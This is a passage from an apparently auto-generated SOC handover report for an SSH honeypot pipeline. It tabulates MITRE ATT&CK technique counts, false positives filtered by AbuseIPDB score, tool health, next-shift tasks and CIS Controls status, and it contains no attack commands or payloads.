| [T1078](https://attack.mitre.org/techniques/T1078) | 220 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 81 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 36 |

---

## 🔕 False Positive Summary (64 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 22 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 4 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 5 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 400 cases |
| Tool 34  | Credential Extractor        | ✅ 7303 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 24 fingerprints |
| Tool 36  | Command Clustering          | ✅ 97 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 185 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 64 filtered (16.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 84 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 217 priority case(s) shown individually · 108 recon entry/entries in table (9 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-27T20:31:56Z_
